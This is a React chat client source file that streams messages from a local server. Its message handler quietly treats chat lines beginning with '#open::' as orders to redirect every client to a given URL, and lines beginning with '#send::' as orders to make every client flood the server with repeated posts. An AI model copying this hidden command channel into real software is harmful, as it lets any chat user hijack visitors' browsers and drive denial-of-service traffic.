import React, { Component } from 'react';
import axios from 'axios';
import './App.css';

function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}

class App extends Component {
  state = {
    messages: [],
    username: "",
    usernameConfirmed: false,
    sentMessages: 0,
    message: "",
    color: 'green',
  };

  async componentDidMount() {
    this.getMessages();
  }

  componentDidUpdate(prevProps, prevState) {
    if (!prevState.usernameConfirmed && this.state.usernameConfirmed) {
      const objDiv = document.getElementById("chatwindow");
      if (objDiv) {
        objDiv.scrollTop = objDiv.scrollHeight;
      }
    }

    if (this.state.messages.length > 10) {
      this.setState({ messages: [] });
    }
  }

  getMessages = async () => {
    try {
      const evtSource = new EventSource("http://localhost:3080/sse/stream");
      evtSource.addEventListener('message', this.handleMessage);
      evtSource.addEventListener('open', (e) => {
        console.log("moi", e);
      })
    } catch (err) {
      console.log("error: ", err);
    }
  };

  sendMessage = (e) => {
    e.preventDefault();
    axios.post("http://localhost:3080/sse/message", {
      name: this.state.username,
      message: this.state.message,
      color: this.state.color,
    });
    this.setState({ message: "" });
  };

  handleCommand = data => {
    console.log(data);
    if (!data[0]) return;
    if (data[0].message[0] === "#") {
      const splittedMessage = data[0].message.split('::');
      const command = splittedMessage[0];
      if (command === "#open") {
        window.open(splittedMessage[1], "_self");
      } else if (command === "#send") {
        const name = splittedMessage[1];
        const message = splittedMessage[2];
        const interval = splittedMessage[3];
        console.log(name, message, interval);
        if (this.messageInterval) clearInterval(this.messageInterval);
        this.messageInterval = setInterval(() => {
          this.setState(prevState => ({
            sentMessages: prevState.sentMessages + 1
          }));
          axios.post("http://localhost:3080/sse/message", {
            name,
            message,
            color: "green"
          });
        }, interval || 1000);
      }
    }
  }

  handleMessage = e => {
    const data = JSON.parse(e.data);
    this.handleCommand(data);
    this.setState({ messages: [ ...this.state.messages, ...data ] });
    setTimeout(() => {
      const objDiv = document.getElementById("chatwindow");
      if (objDiv) {
        objDiv.scrollTop = objDiv.scrollHeight;
      }
    }, 200);
  };

  changeUsername = (e) => {
    this.setState({ username: e.target.value })
  };

  confirmUsername = () => {
    this.setState({
      usernameConfirmed: true,
      color: `green`,
    });
  };

  startSending = () => {
    if (this.messageInterval) clearInterval(this.messageInterval);
    this.messageInterval = setInterval(() => {
      axios.post("http://localhost:3080/sse/message", {
        name: 'Santeri',
        message: 'Moikka!',
        color: 'green',
      });
    }, this.state.interval || 1000);
  };

  handleMessageChange = (e) => {
    this.setState({ message: e.target.value });
  };

  renderMessages = () => {
    return this.state.messages.map((message, i) => {
      return (
        <div className="Message-wrapper" key={i}>
          <div className="Message-block" key={i} style={{ float: message.name === this.state.username ? "right" : "left" }}>
            <div className="Message-name" style={{ color: message.color }}>{message.name}</div>
            <div className="Message-content">{message.message}</div>
          </div>
        </div>
      );
    });
  };

  render() {
    const { usernameConfirmed, sentMessages } = this.state;

    return (
      <div className="App">
        <header className="App-header">
          <h1 className="App-title">Chat</h1>
          <button onClick={this.startSending}>Laheta</button>
          <input onChange={e => this.setState({ interval: e.target.value })} />
          <div style={{ float: "right" }}>{sentMessages}</div>
        </header>
        {!usernameConfirmed ?
          <div className="Login-div">
            <p style={{ fontWeight: "bold", fontSize: "16px" }}>Anna käyttäjänimi</p>
            <input className="Login-input" value={this.state.username} onChange={this.changeUsername} type="text" />
            <div className="Ok-button" onClick={this.confirmUsername}>Ok</div>
          </div> :
          <div className="Chat-window">
            <div id="chatwindow" className="Message-div">
              {this.renderMessages()}
            </div>
            <form onSubmit={this.sendMessage}>
              <div className="Chat-input">
                <input className="Chat-inputfield" onChange={this.handleMessageChange} value={this.state.message} type="text" />
                <div className="Send-button" onClick={this.sendMessage}>Lähetä</div>
              </div>
            </form>
          </div>
        }
      </div>
    );
  }
}

export default App;
